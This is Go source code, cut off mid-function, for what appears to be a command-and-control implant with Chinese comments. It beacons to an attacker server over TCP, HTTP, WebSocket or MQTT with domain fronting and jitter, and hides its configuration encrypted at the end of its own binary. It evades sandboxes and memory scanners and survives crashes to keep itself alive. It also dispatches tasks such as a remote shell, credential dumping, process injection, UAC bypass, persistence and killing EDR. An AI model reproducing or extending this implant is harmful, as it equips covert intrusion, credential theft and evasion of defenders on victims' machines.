package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	cyrand "crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"hash/crc32"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

)

var (
	sessionID     uint64
	serverAddr    string
	frontDomain   string // 域前置拟态域名：HTTPS 轮询时用作 TLS SNI 与 HTTP Host
	transportMode string // 通道类型：tcp / http（构建时按协议写入；空则按 server_url 前缀回退）
	interval      time.Duration
	encryptionKey []byte
	tunnelKey     []byte // SM4-CTR 隧道子密钥（SHA-256 域分离派生）
	relayListen   string // 中继监听地址（非空时启用中继角色）
	conn          net.Conn
	connMu        sync.Mutex
	writeQueue    chan *Packet     // 控制消息：任务结果/心跳/Shell
	tunnelFrameCh chan []byte      // 隧道数据帧（批量写出，降低锁竞争与系统调用）
	writeWg       sync.WaitGroup
	stopWrite     chan struct{}
	exitRequested atomic.Bool    // 收到"exit"任务后置位：发送结果帧即退出进程

	// 心跳抖动（jitter）：心跳间隔在 base ±jitter% 范围内随机，
	// 打破固定节奏的流量指纹，降低周期性检测识别。
	jitterPct int

	// 启动随机延迟（秒，构建期注入占位符）：启动后随机休眠 [min,max] 秒，
	// 打乱"启动即连/即行为"的检测节奏，降低主动防御在启动阶段的拦截概率。
	startupDelayMin = {{STARTUP_DELAY_MIN}}
	startupDelayMax = {{STARTUP_DELAY_MAX}}

	// 重连指数退避：连续失败时等待时间按 2^n 增长（受 RETRY_WAIT 与上限约束）。
	retryWaitSec  int
	maxBackoffSec int
	consecFail    int

	// KillDate：到达该日期后进程直接自杀退出（清理现场，避免长期驻留）。
	killDateStr string
	// WorkingHours：仅在工作时段内回连与执行任务，其余时间静默休眠。
	workStartMin, workEndMin int
	workHoursValid           bool

	// AES-GCM 实例按最终密钥一次性初始化并复用（B2），避免每帧重建 cipher。
	aesOnce    sync.Once
	aesgcm     cipher.AEAD
	gcmNonceSz int

	// 任务串行 worker（B1）：processData 只入队，taskWorker 顺序执行，
	// 长任务（大文件直传/BOF/凭证抓取）不再阻塞读循环与心跳。
	taskCh chan Task

	// 任务结果缓存（会话热迁移去重）：taskID → 已序列化的结果 JSON。
	// 重连后服务端补发在途任务，已执行过的任务直接回放缓存结果，
	// 避免重复执行副作用（如二次注入/二次删文件）。
	// 仅缓存最近 N 条，防止内存无限增长。
	resultCacheMu    sync.Mutex
	resultCache      map[uint64][]byte
	resultCacheOrder []uint64

	// connGen 标记当前 C2 连接世代；重连自增，旧连接 worker 据此丢弃过期任务结果。
	connGen atomic.Uint64
)

// 半开连接（silent drop）检测：TCP 半开时心跳写入内核缓冲会"成功"，
// 写侧无法感知链路已死，只能靠读侧判死触发重连。
// 读侧按"总空闲时长"判死：连续读超时且无任何字节达到阈值，判定 C2 链路失效。
const (
	activeReadTimeout   = 2 * time.Second  // 活跃期（最近收到数据）：短超时快速感知断连
	idleReadTimeout     = 10 * time.Second // 空闲期（等待心跳 ACK）：拉长超时，降低 syscall 频率（B4）
	maxIdleReadDuration = 60 * time.Second // 总空闲上限：约覆盖 8 个心跳周期（interval 5s + jitter 2s）
)

var (
	idleReadTimeouts int
	firstIdleAt      time.Time
)

// readDeadline 按链路活跃度动态选择读超时：活跃期短超时快感知、空闲期长超时少 syscall（B4）。
func readDeadline() time.Duration {
	if idleReadTimeouts > 0 {
		return idleReadTimeout
	}
	return activeReadTimeout
}

// touchRead 收到任何字节即证明链路存活，重置空闲计时。
func touchRead() {
	idleReadTimeouts = 0
	firstIdleAt = time.Time{}
}

// markIdleTimeout 累计空闲超时；从首次空闲起超过 maxIdleReadDuration 返回 true（链路已死）。
func markIdleTimeout() bool {
	if idleReadTimeouts == 0 {
		firstIdleAt = time.Now()
	}
	idleReadTimeouts++
	return time.Since(firstIdleAt) >= maxIdleReadDuration
}

// 协议魔数由运行时解码生成，避免 "TSHL" 连续字节以明文出现在二进制中。
var (
	Magic0 byte = xd("0e2ee88f")[0]
	Magic1 byte = xd("0e2ee88f")[1]
	Magic2 byte = xd("0e2ee88f")[2]
	Magic3 byte = xd("0e2ee88f")[3]
)

const (
	Version       = 0x01
	HeaderSize    = 30
	TypeRegister  = 0x00
	TypeHeartbeat = 0x01
	TypeTask      = 0x02
	TypeResult    = 0x03
	TypeFileUp    = 0x04
	TypeFileDown  = 0x05
	TypeAck       = 0x06
	TypeShellOpen = 0x07
	TypeShellData = 0x08
	TypeShellClose = 0x09
	TypeTunnel    = 0x0A
	TypeRelay     = 0x0B // 链式回连：中继节点转发的子会话帧
	TypeScreenFrame = 0x0C // 实时屏幕流：屏幕帧
	TypeRelayStatus = 0x0D // 中继节点监听状态上报（{addr}，空=已停止）

	// 帧类型字节：4B 长度前缀之后，0=控制帧(AES-GCM)，1=隧道帧(XOR)。
	// 不使用长度高位标记，避免长度值 ≥ 2^31 被中间代理误判为超大包而吞帧。
	frameTypeControl = 0x00
	frameTypeRaw     = 0x01

	// maxFrameSize 与 C2 服务端对齐：长度前缀来自明文网络帧头，不做上限检查时，
	// 异常/错位的长度值会导致 make([]byte, 巨值) 分配失败引发 OOM panic，
	// 进程崩溃后永不重连（main 循环无 recover）。
	maxFrameSize = 16 * 1024 * 1024 // 16MB
)

type Packet struct {
	Magic     [4]byte
	Version   byte
	Type      byte
	Length    uint32
	ID        uint64
	Timestamp uint64
	Checksum  uint32
	Payload   []byte
}

type Register struct {
	Hostname     string
	Username     string
	OS           string
	Arch         string
	PID          uint32
	ProcessName  string
	IPAddresses  []string
	MACAddresses []string
	Domain       string
}

type Task struct {
	ID       uint64
	TaskType string
	Command  string
	Args     []string
	Path     string
	PID      uint32
	Data     string
}

type Result struct {
	TaskID   uint64
	TaskType string
	ExitCode int32
	Output   string
	Error    string
}

type Heartbeat struct {
	Status     string
	CPUUsage   float32
	MemoryUsed uint64
}

// configBlockMagic 是追加在二进制尾部的配置块标识，服务端写入、implant 启动时读取。
// 编译期由服务端混淆工具加密为 xd("hex") 密文，二进制中不保留明文。
var configBlockMagic = "TOSHELL_CFG_V1:"

// implantConfig 是从尾部配置块解析出的运行时配置
type implantConfig struct {
	ServerURL     string `json:"server_url"`
	EncryptionKey string `json:"encryption_key"` // base64
	Interval      int    `json:"interval"`
	Jitter        int    `json:"jitter"`
	RetryWait     int    `json:"retry_wait"`
	KillDate      string `json:"kill_date"`
	WorkingHours  string `json:"working_hours"`
	RelayListen   string `json:"relay_listen"` // 中继监听地址（非空启用中继角色）
	FrontDomain   string `json:"front_domain"` // 域前置拟态域名（SNI/Host）
	Transport     string `json:"transport"`    // 通道类型：tcp / http（构建时按协议写入；空则按前缀回退）
}

// loadConfigFromSelf 扫描自身可执行文件尾部，查找配置块并解析
// 格式：...binary... | encMagic | <4字节大端长度(加密)> | <JSON(加密)>
// encMagic 为加密后的配置块标识（常量），通过它定位块起点，
// 长度字段与 JSON 用循环密钥加密（xdBlockAt，密钥流从块内偏移开始）。
func loadConfigFromSelf() *implantConfig {
	exe, err := os.Executable()
	if err != nil {
		return nil
	}
	data, err := os.ReadFile(exe)
	if err != nil {
		return nil
	}

	encMagic := xdBlock([]byte(configBlockMagic))
	mlen := len(encMagic)

	if len(data) < mlen+4 {
		return nil
	}

	// 找最后一个加密 magic 作为配置块起点
	start := -1
	for i := len(data) - mlen; i >= 0; i-- {
		if bytes.Equal(data[i:i+mlen], encMagic) {
			start = i
			break
		}
	}
	if start < 0 {
		return nil
	}

	// 长度字段位于加密 magic 之后（块内偏移 mlen 起），密钥流从该偏移开始
	lenStart := start + mlen
	if lenStart+4 > len(data) {
		return nil
	}
	lenBuf := xdBlockAt(data[lenStart:lenStart+4], mlen)
	jsonLen := int(binary.BigEndian.Uint32(lenBuf))
	if jsonLen < 0 || jsonLen > len(data) {
		return nil
	}

	// JSON 位于长度字段之后（块内偏移 mlen+4 起），密钥流从该偏移开始
	jsonStart := lenStart + 4
	if jsonStart+jsonLen > len(data) {
		return nil
	}
	jsonData := xdBlockAt(data[jsonStart:jsonStart+jsonLen], mlen+4)

	var cfg implantConfig
	if err := json.Unmarshal(jsonData, &cfg); err != nil {
		return nil
	}
	return &cfg
}

func main() {
	// 启动默认随机延迟：先休眠 [startupDelayMin, startupDelayMax] 秒（构建期配置，默认 5~30s），
	// 打乱"启动即连/即行为"的检测节奏，降低主动防御在启动阶段的拦截概率。
	if startupDelayMax >= startupDelayMin && startupDelayMin > 0 {
		d := startupDelayMin + int(time.Now().UnixNano()%int64(startupDelayMax-startupDelayMin+1))
		time.Sleep(time.Duration(d) * time.Second)
	}

	// 反沙箱/反调试：命中可疑环境时延迟执行（Windows 下有效，其它平台为空操作）
	evasionInit()

	// 编译时内嵌的默认值（由 processTemplates 替换）
	serverAddr = "{{SERVER_URL}}"
	interval = {{INTERVAL}} * time.Second
	{{JITTER_LINE}}
	{{RETRY_WAIT_LINE}}
	{{KILL_DATE_LINE}}
	{{WORKING_HOURS_LINE}}
	{{RELAY_LISTEN_LINE}}

	// ENCRYPTION_KEY_START
	encryptionKey, _ = base64.StdEncoding.DecodeString("{{ENCRYPTION_KEY}}")
	// ENCRYPTION_KEY_END

	// 尝试从自身尾部读取动态配置，若存在则覆盖编译时默认值
	// 注意：被 Donut 注入到宿主进程后，os.Executable() 返回宿主进程路径，
	// 配置块在宿主文件里找不到，会直接 fallback 到上方编译时内嵌的值（正确行为）
	if dynCfg := loadConfigFromSelf(); dynCfg != nil {
		if dynCfg.ServerURL != "" {
			serverAddr = dynCfg.ServerURL
		}
		if dynCfg.EncryptionKey != "" {
			if key, err := base64.StdEncoding.DecodeString(dynCfg.EncryptionKey); err == nil && len(key) > 0 {
				encryptionKey = key
			}
		}
		if dynCfg.Interval > 0 {
			interval = time.Duration(dynCfg.Interval) * time.Second
		}
		if dynCfg.Jitter >= 0 && dynCfg.Jitter <= 100 {
			jitterPct = dynCfg.Jitter
		}
		if dynCfg.RetryWait > 0 {
			retryWaitSec = dynCfg.RetryWait
		}
		if dynCfg.KillDate != "" {
			killDateStr = dynCfg.KillDate
		}
		if dynCfg.WorkingHours != "" {
			applyWorkingHours(dynCfg.WorkingHours)
		}
		if dynCfg.RelayListen != "" {
			relayListen = dynCfg.RelayListen
		}
		if dynCfg.FrontDomain != "" {
			frontDomain = dynCfg.FrontDomain
		}
		if dynCfg.Transport != "" {
			transportMode = dynCfg.Transport
		}
	}

	// 心跳间隔下限保护：interval 被替换为 0 时兜底，避免心跳风暴
	if interval < 2*time.Second {
		interval = 5 * time.Second
	}
	// 重连基础等待下限
	if retryWaitSec <= 0 {
		retryWaitSec = 5
	}
	if maxBackoffSec <= 0 {
		maxBackoffSec = 600
	}

	sessionID = generateSessionID()

	// AES-GCM 实例按最终密钥一次性初始化（B2）：密钥可能被尾部配置块覆盖，故置于加载之后。
	initAES()
	// SM4-CTR 隧道子密钥：与控制通道 AES-GCM 密钥域分离，避免跨算法密钥复用。
	tunnelKey = deriveSM4Key(encryptionKey)
	// 免杀：AES/SM4 密钥已派生到 aesgcm/tunnelKey（各自持有副本），把原始密钥缓冲清零并释放，
	// 缩短主密钥在堆内存的明文驻留窗口，降低内存扫描命中。
	zeroBytes(encryptionKey)
	encryptionKey = nil
	// 中继角色：relayListen 非空时，除直连 C2 外额外监听子植入体连接（Beacon Mesh）。
	_ = startRelayListener(relayListen)

	for {
		// KillDate 自杀检查：到达指定日期后立即退出进程
		if killDateReached() {
			os.Exit(0)
		}

		// WorkingHours 静默休眠：非工作时段不连接、不执行，等下一轮再判断
		if workHoursValid && !inWorkingHours() {
			time.Sleep(5 * time.Minute)
			continue
		}

		func() {
			defer func() {
				if r := recover(); r != nil {
					// panic 兜底：任何未预期的 panic 都不允许终止进程，
					// 等待退避后照常重连，保证植入端永远存活。
				}
			}()
			run()
		}()

		// 重连指数退避：连续失败次数越多，等待越久（1x,2x,4x,8x... 封顶 maxBackoffSec）
		wait := retryWaitSec
		for i := 0; i < consecFail && i < 8; i++ {
			wait *= 2
			if wait >= maxBackoffSec {
				wait = maxBackoffSec
				break
			}
		}
		if wait < retryWaitSec {
			wait = retryWaitSec
		}
		if consecFail < 1<<30 {
			consecFail++
		}
		time.Sleep(time.Duration(wait) * time.Second)
	}
}

func run() {
	cleanupShell()

	// 通道选择：优先按构建时的 transport 字段（tcp/http/websocket）；
	// 旧版构建无该字段时按 server_url 前缀回退（http(s):// → HTTP 轮询）。
	// 注意：TCP 监听器不是 HTTP 服务，带 http:// 前缀的地址必须在 transport=tcp
	// 时仍走自定义 TCP 帧协议（由 stripServerPrefix 剥离前缀）。
	if transportMode == "websocket" || (transportMode == "" && isWSTransport(serverAddr)) {
		wsPollRun()
		return
	}
	if transportMode == "mqtt" || (transportMode == "" && isMQTTTransport(serverAddr)) {
		mqttPollRun()
		return
	}
	useHTTP := transportMode == "http" || (transportMode == "" && isHTTPTransport(serverAddr))
	if useHTTP {
		httpPollRun()
		httpMode = false
		return
	}
	httpMode = false

	// 多 C2：serverAddr 支持逗号分隔多个服务器（如 "a:8080,b:8080"），
	// 逐个尝试连接直到成功；全部失败则返回，由主循环按指数退避后重试。
	var err error
	conn = nil
	for _, raw := range parseServerList(serverAddr) {
		addr := stripServerPrefix(raw)
		if addr == "" {
			continue
		}
		conn, err = dialServer(addr)
		if err == nil {
			break
		}
	}
	if conn == nil {
		return
	}
	consecFail = 0 // 连接成功：重置连续失败计数，退避归零
	defer conn.Close()
	defer func() {
		stopWriteLoop()
		// 等待重活任务排空：大文件下载/注入等异步任务可能仍在执行，
		// 需等其结果帧写出后再关连接，避免结果丢失（服务端会因超时重新下发）。
		heavyWg.Wait()
		resetPool() // 清理残留隧道，避免重连后旧隧道 goroutine 挂住失效连接
		if taskCh != nil {
			close(taskCh) // 停止接受新任务，worker 排空当前任务后退出
			taskCh = nil
		}
	}()

	// TCP 连接设置 keepalive，避免空闲被中间设备断开
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
		tcpConn.SetNoDelay(true)
		// 放大 C2 链路 socket 缓冲（承载所有隧道数据的复用连接）。
		// 默认缓冲是窄管道；nps/frp 均在 bridge 上设大缓冲。
		tcpConn.SetReadBuffer(1024 * 1024)
		tcpConn.SetWriteBuffer(1024 * 1024)
	}

	writeQueue = make(chan *Packet, 512) // 控制消息
	stopWrite = make(chan struct{})
	writeWg.Add(1)
	go writeLoop()

	// B1：任务串行 worker。读循环只把任务入队，长任务不阻塞心跳；
	// worker 发送结果前校验连接世代（connGen），重连后旧结果作废。
	gen := connGen.Add(1)
	taskCh = make(chan Task, 16)
	go taskWorker(gen)

	// 每次新连接清空结果缓存：服务端重启后 task.ID 会重新从 1 开始分配，
	// 若保留旧缓存，新任务的 task.ID 会命中旧结果，造成任务输出错位/乱序。
	clearResultCache()

	// 隧道数据帧批量写出：单 goroutine 合并多帧为一次 writev，消除每帧加锁与系统调用。
	tunnelFrameCh = make(chan []byte, 8192)
	writeWg.Add(1)
	go tunnelFrameWriter()

	if !register() {
		return
	}

	lastHeartbeat := time.Now()
	heartbeatFailures := 0
	maxHeartbeatFailures := 5 // 对标 gost：增加容错次数
	// 防御：构建参数 INTERVAL 若被替换成 0，会导致每圈狂发心跳并误判失败。
	hbInterval := jitteredInterval(interval)

	for {
		now := time.Now()

		if now.Sub(lastHeartbeat) >= hbInterval {
			if !sendHeartbeat() {
				heartbeatFailures++
				if heartbeatFailures >= maxHeartbeatFailures {
					return
				}
			} else {
				// 对标 gost Ping()：成功一次即重置失败计数器
				heartbeatFailures = 0
				lastHeartbeat = now
				// Jitter：每次心跳成功后重新随机计算下一次间隔，打破固定节奏
				hbInterval = jitteredInterval(interval)
			}
		}

		// 对标 gost tcpKeepAliveListener：2s 超时可感知对端断连。
		// 帧头累积式读取：超时只重置 deadline、保留已读字节，
		// 避免 io.ReadFull 超时半帧丢弃导致帧流错位、隧道数据损坏（ERR_SSL_PROTOCOL_ERROR）。
		var lenBuf [4]byte
		var hdrGot int
		for hdrGot < len(lenBuf) {
			conn.SetReadDeadline(time.Now().Add(readDeadline()))
			n, err := conn.Read(lenBuf[hdrGot:])
			hdrGot += n
			if n > 0 {
				touchRead() // 收到任何字节即证明链路存活
			}
			if err != nil {
				if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
					if markIdleTimeout() {
						// 半开连接：总空闲超时收不到任何数据（含心跳 ACK），判定链路已死，触发重连
						return
					}
					continue
				}
				return
			}
		}
		rawLen := binary.BigEndian.Uint32(lenBuf[:])
		if rawLen == 0 || rawLen > maxFrameSize {
			return // 非法帧长度：协议错位/异常帧头，关闭连接并重连
		}

		// 读 1B 帧类型
		var typeBuf [1]byte
		if !readFullNoDrop(typeBuf[:]) {
			return
		}

		// ─── gost fast path: raw 隧道帧（无 AES-GCM） ───
		if typeBuf[0] == frameTypeRaw {
			length := rawLen
			data := make([]byte, length)
			if !readFullNoDrop(data) {
				return
			}
			// SM4-CTR 解密：剥离 16B IV 后原地解密
			data = sm4DecryptTunnel(data, tunnelKey)
			processTunnelRaw(data)
			continue
		}

		// ─── 控制帧: AES-GCM ───
		length := rawLen
		data := make([]byte, length)
		if !readFullNoDrop(data) {
			return
		}

		processData(data)
	}
}

// readFullNoDrop 累积式读满 buf：每次读前重置动态 deadline（readDeadline），超时仅继续（保留已读字节），
// 杜绝 io.ReadFull 超时半帧丢弃导致的帧流错位（隧道数据损坏 / ERR_SSL_PROTOCOL_ERROR）。
func readFullNoDrop(buf []byte) bool {
	got := 0
	for got < len(buf) {
		conn.SetReadDeadline(time.Now().Add(readDeadline()))
		n, err := conn.Read(buf[got:])
		got += n
		if n > 0 {
			touchRead() // 收到数据即证明链路存活
		}
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				if markIdleTimeout() {
					return false // 半开连接：告知 run() 触发重连
				}
				continue
			}
			return false
		}
	}
	return true
}

func stopWriteLoop() {
	if stopWrite != nil {
		close(stopWrite)
		// 不 close writeQueue/tunnelFrameCh：stopWrite 关闭后两个 writer 会排空退出，
		// 若此处 close channel，并发发送方（心跳/隧道帧/ACK）会 panic。
		writeWg.Wait()
		stopWrite = nil
	}
}

// processTunnelRaw 分发隧道帧（已 SM4-CTR 解密）。
// 新 raw 路径：一帧 = 一条消息，rawData[0] 为已知 op 直接 decode。
// 旧 AES-GCM 路径：rawData = [4B pktLen][msg][4B pktLen][msg]... 批量解码，向后兼容。
func processTunnelRaw(rawData []byte) {
	if len(rawData) == 0 {
		return
	}
	// 判断第一个字节是否是已知 op 码（raw 新路径）还是 pktLen 首字节（旧路径）
	if rawData[0] == OpSync || rawData[0] == OpWrite || rawData[0] == OpClose || rawData[0] == OpAck {
		processMsg(rawData)
		return
	}
	// 旧批量格式兼容
	offset := 0
	for offset+4 <= len(rawData) {
		dl := binary.BigEndian.Uint32(rawData[offset:])
		offset += 4
		if offset+int(dl) > len(rawData) {
			break
		}
		processMsg(rawData[offset : offset+int(dl)])
		offset += int(dl)
	}
}

// writeLoop 仅处理控制消息（writeQueue）。隧道数据已走 writeRawFrame 快速路径。
func writeLoop() {
	defer writeWg.Done()
	defer func() {
		if r := recover(); r != nil {
			// goroutine panic 会终止整个进程，必须兜底
		}
	}()

	for {
		select {
		case <-stopWrite:
			for {
				select {
				case packet := <-writeQueue:
					writePacket(packet)
				default:
					return
				}
			}
		case packet := <-writeQueue:
			if packet != nil {
				writePacket(packet)
			}
		}
	}
}

// writePacket 编码、压缩、AES-GCM 加密并发送控制消息。
// 由 writeLoop 调用，调用者通过 connMu 序列化。
func writePacket(packet *Packet) bool {
	if packet == nil {
		return true
	}
	data := encodePacket(packet)
	compressed, _ := compress(data)
	encrypted, _ := encrypt(compressed)

	blob := make([]byte, 5+len(encrypted))
	binary.BigEndian.PutUint32(blob[:4], uint32(len(encrypted))) // 长度前缀为真实长度
	blob[4] = frameTypeControl
	copy(blob[5:], encrypted)

	connMu.Lock()
	defer connMu.Unlock()

	if conn == nil {
		return false
	}

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err := conn.Write(blob)
	return err == nil
}

// writeRawFrame 对标 gost transport io.Copy 的直接写入：
// 隧道数据 → SM4-CTR 加密(随机16B IV + 密文) → [4B len][1B type=raw] + data → net.Buffers.WriteTo (一次 writev)。
// 无队列、无 AES-GCM、无 gzip（data 由调用者分配并转移所有权）。
func writeRawFrame(data []byte) bool {
	if len(data) == 0 || conn == nil {
		return false
	}

	// SM4-CTR 加密：返回 [16B IV][密文]，长度 +16
	data = sm4EncryptTunnel(data, tunnelKey)

	connMu.Lock()
	defer connMu.Unlock()

	if conn == nil {
		return false
	}

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))

	// net.Buffers 零拷贝 writev（对标服务端 writeRaw）：4B 真实长度 + 1B 帧类型 + data
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(data)))
	var typeBuf [1]byte = [1]byte{frameTypeRaw}

	buf := net.Buffers{lenBuf[:], typeBuf[:], data}
	_, err := buf.WriteTo(conn)
	return err == nil
}

// tunnelFrameWriter 单 goroutine 消费 tunnelFrameCh（已是完整 C2 帧：[4B len|flag]+XOR(信封)），
// 将多帧合并为一次 net.Buffers.WriteTo(writev) 写出，避免每帧单独加锁与系统调用。
// 关键优化（对标 nps）：
//   - 帧缓冲由 readLoop 在池中获取，此处写完即归还池，全程零每包堆分配；
//   - 去除原 2ms 定时器节流（那是隐藏的人为延迟天花板）：改为「读到即批、无更多立发」，
//     突发流量按 maxBatchFrames 合并为一次 writev，零散流量零等待直发，延迟与吞吐兼得。
// 连接关闭（stopWrite/chan 关闭）时 flush 残余并退出。
func tunnelFrameWriter() {
	defer writeWg.Done()
	defer func() {
		if r := recover(); r != nil {
			// goroutine panic 会终止整个进程，必须兜底
		}
	}()

	const maxBatchFrames = 64
	batch := make(net.Buffers, 0, maxBatchFrames)

	flush := func() {
		if len(batch) == 0 {
			return
		}
		connMu.Lock()
		if conn != nil {
			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if _, err := batch.WriteTo(conn); err != nil {
				// 写失败（对端 RST/网络中断）：关闭连接，让读循环立即感知并触发重连。
				conn.Close()
			}
		}
		connMu.Unlock()
		// 归还本批所有帧缓冲到池（避免泄漏，且供 readLoop 复用）。
		// 关键：按 cap 还原为完整长度归还。若直接 Put 子切片 fb[:13+n]，下次 Get 拿回的是
		// 被截断的小缓冲，readLoop 每轮只能读 ~1 字节 → 帧被切碎成海量小帧 → 吞吐骤降、
		// TLS 握手在高 RTT 下超时（浏览器报 ERR_SSL_PROTOCOL_ERROR）。
		for _, f := range batch {
			tunnelBufPool.Put(f[:cap(f)])
		}
		batch = batch[:0]
	}

	for {
		select {
		case <-stopWrite:
			flush()
			return
		case frame, ok := <-tunnelFrameCh:
			if !ok {
				flush()
				return
			}
			batch = append(batch, frame)
		}

		// 非阻塞排空当前可用帧，合并为一次 writev；无更多帧则立即 flush（零等待）。
		for len(batch) < maxBatchFrames {
			select {
			case frame, ok := <-tunnelFrameCh:
				if !ok {
					flush()
					return
				}
				batch = append(batch, frame)
			default:
				goto doFlush
			}
		}
	doFlush:
		flush()
	}
}



// buildRegisterPacket 构造注册帧（TCP 与 HTTPS 通道共用）。
func buildRegisterPacket() *Packet {
	hostname, _ := os.Hostname()
	username := getUsername()
	username = strings.Split(username, "\\")[len(strings.Split(username, "\\"))-1]
	processName := getProcessName()

	payload, _ := json.Marshal(Register{
		Hostname:     hostname,
		Username:     username,
		OS:           runtime.GOOS,
		Arch:         runtime.GOARCH,
		PID:          uint32(os.Getpid()),
		ProcessName:  processName,
		IPAddresses:  []string{},
		MACAddresses: []string{},
		Domain:       "",
	})

	return &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeRegister,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   payload,
	}
}

func register() bool {
	return sendPacketSync(buildRegisterPacket())
}

func getProcessName() string {
	executable, err := os.Executable()
	if err != nil {
		return "unknown"
	}
	return filepath.Base(executable)
}

// B3：心跳 JSON 内容恒定，预构建字节避免每心跳 json.Marshal 与结构体分配。
var heartbeatPayload = []byte(`{"Status":"alive","CPUUsage":0,"MemoryUsed":0}`)

func sendHeartbeat() bool {
	packet := &Packet{
		Magic:     [4]byte{Magic0, Magic1, Magic2, Magic3},
		Version:   Version,
		Type:      TypeHeartbeat,
		ID:        sessionID,
		Timestamp: uint64(time.Now().UnixMilli()),
		Payload:   heartbeatPayload,
	}

	// 心跳走同步写（sendPacketSync）：直接检查 conn.Write 底层错误。
	// 半开 TCP 下写会"成功"无法感知，但连接 RST/EOF 时能立即暴露，
	// 与读侧空闲判死（maxIdleReadDuration）共同保证链路死亡必然触发重连。
	return sendPacketSync(packet)
}

func processData(data []byte) {
	packet, err := parsePacket(data)
	if err != nil {
		return
	}
	if packet == nil {
		return
	}

	switch packet.Type {
	case TypeAck:
		// 注册/心跳 ACK：证明 C2 双向可达，清零半开连接计数
		touchRead()

	case TypeFileUp:
		handleFileUp(packet)

	case TypeTask:
		var task Task
		if err := json.Unmarshal(packet.Payload, &task); err != nil {
			return
		}

		// B1：任务交给串行 worker 异步执行，读循环立即返回继续收包/心跳，
		// 长任务（大文件直传/BOF/凭证抓取）不再阻塞心跳导致服务端误判离线。
		select {
		case taskCh <- task:
		default:
			// 队列满载（极端情况）回退同步执行，保证任务不丢失
			executeAndSendResult(task, connGen.Load())
		}

	case TypeShellOpen:
		handleShellOpen(packet)

	case TypeShellData:
		handleShellData(packet)

	case TypeShellClose:
		handleShellClose()

	case TypeTunnel:
		// Payload = [4B total_len][4B len0][pkt0][4B len1][pkt1]...
		if len(packet.Payload) >= 4 {
			totalLen := binary.BigEndian.Uint32(packet.Payload[:4])
			if len(packet.Payload) >= 4+int(totalLen) {
				processTunnelRaw(packet.Payload[4 : 4+int(totalLen)])
			}
		}

	case TypeRelay:
		// 中继节点收到的下行帧：解包后写回对应子植入体连接
		handleRelayDown(packet.Payload)
	}
}

// taskWorker 消费任务队列（B1）：轻任务串行执行（保证共享状态安全），
// 重活任务（大文件下载/上传、截图、BOF、注入等耗时操作）丢入独立 goroutine 池，
// 避免大文件下载独占执行线程、堵塞其他任务（echo/shell/进程列表）。
// 发送结果前校验连接世代，重连后自动作废旧任务结果（服务端会重新下发）。
func taskWorker(gen uint64) {
	defer func() {
		if r := recover(); r != nil {
			// worker panic 兜底：绝不终止植入进程
		}
	}()

	for task := range taskCh {
		if isHeavyTask(task.TaskType) {
			// 重活任务：立即调度到独立 goroutine，不阻塞后续任务消费。
			// 用 WaitGroup 跟踪，连接换代时由 run() 的 defer 等待排空。
			heavyWg.Add(1)
			go func(t Task) {
				defer heavyWg.Done()
				defer func() {
					if r := recover(); r != nil {
						// 重活任务 panic 兜底：不回结果（服务端按超时处理），绝不终止进程
					}
				}()
				executeAndSendResult(t, gen)
			}(task)
			continue
		}
		executeAndSendResult(task, gen)
	}
}

// heavyWg 跟踪进行中的重活任务，run() 返回前等待排空。
var heavyWg sync.WaitGroup

// isHeavyTask 判断任务是否为耗时重活（需要异步执行避免堵塞其他任务）。
// 大文件下载（>2MB 走分块直传循环）、上传、截图、BOF/DLL 加载、注入、
// 凭据导出、EDR 操作等都可能耗时数秒到数十秒。
func isHeavyTask(taskType string) bool {
	switch taskType {
	case "file_download", "file_upload", "screenshot", "screen_stream",
		"bof_load", "plugin_exe", "plugin_dll", "plugin_shellcode",
		"fileless_exec", "process_inject", "process_spoof", "auto_inject",
		"injection", "spawn", "uac_bypass", "persistence", "credentials",
		"edr_blind", "edr_kill", "byovd_load", "byovd_unload", "ppl_kill",
		"av_detect":
		return true
	default:
		return false
	}
}

// executeAndSendResult 执行单个任务并同步回传结果帧；"exit" 任务发送后退出进程。
// 会话热迁移：先查结果缓存（重连补发的已执行任务直接回放，不重复执行）。
// 注意：大文件传输类任务（file_download/file_upload）不缓存结果——
// 其成功与否依赖分块是否完整送达，断连即失效；必须由服务端 resume 任务重新执行。
func executeAndSendResult(task Task, gen uint64) {
	// 结果缓存去重：同一 task ID 已执行过 → 直接回放缓存结果（仅非大文件传输类）
	if !isTransferTask(task.TaskType) {
		resultCacheMu.Lock()
		if cached, ok := resultCache[task.ID]; ok {
			resultCacheMu.Unlock()
			if connGen.Load() != gen {
				return
			}
			sendResultPayload(cached)
			return
		}
		resultCacheMu.Unlock()
	}

	result := executeTaskWithTimeout(task)

	// 连接已换代（run 返回重连中）：旧任务结果作废，服务端会重新下发
	if connGen.Load() != gen {
		return
	}

	resultPayload, _ := json.Marshal(result)

	// 写入结果缓存（供重连补发去重），再发送；传输类任务不入缓存
	if !isTransferTask(task.TaskType) {
		cacheResult(task.ID, resultPayload)
	}

	sendResultPayload(resultPayload)

	// 删除主机（exit 任务）：结果帧已同步写出，植入端停止运行
	if exitRequested.Load() {
		time.Sleep(200 * time.Millisecond)
		os.Exit(0)
	}
}

// executeTaskWithTimeout 执行任务并强制超时：任何任务（含 plugin_exe/BOF 等重活）
// 最多运行 execTimeout，超时返回超时结果，绝不无限占住植入端 worker，
// 否则后续任务会一直排队成 sent（植入端看似在线却不执行任务）。
// 用 goroutine + select 实现超时（executeTask 是同步阻塞，无法 context 取消）。
func executeTaskWithTimeout(task Task) Result {
	ch := make(chan Result, 1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				ch <- Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: -1, Error: "task panic: " + fmt.Sprint(r)}
			}
		}()
		ch <- executeTask(task)
	}()

	timeout := execTimeout
